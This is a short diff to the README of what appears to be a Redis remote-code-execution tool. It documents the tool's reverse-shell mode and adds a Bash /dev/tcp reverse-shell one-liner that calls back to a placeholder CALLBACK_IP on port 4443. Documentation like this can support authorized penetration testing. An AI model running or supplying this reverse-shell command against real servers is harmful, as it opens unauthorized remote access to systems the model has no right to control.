@@ -31,6 +31,13 @@ python3 redis-rce.py -r 192.168.168.93 --revshell
 The reverse-shell mode prefers a Python PTY and falls back to Bash. Press
 `Ctrl-]` to disconnect; cleanup runs automatically after the shell closes.
 
+At the normal interactive prompt, direct Bash `/dev/tcp` payloads are
+automatically wrapped for compatibility with the module's `/bin/sh` runner:
+
+```bash
+bash -i >& /dev/tcp/CALLBACK_IP/4443 0>&1
+```
+
 Read-only target check:
 
 ```bash
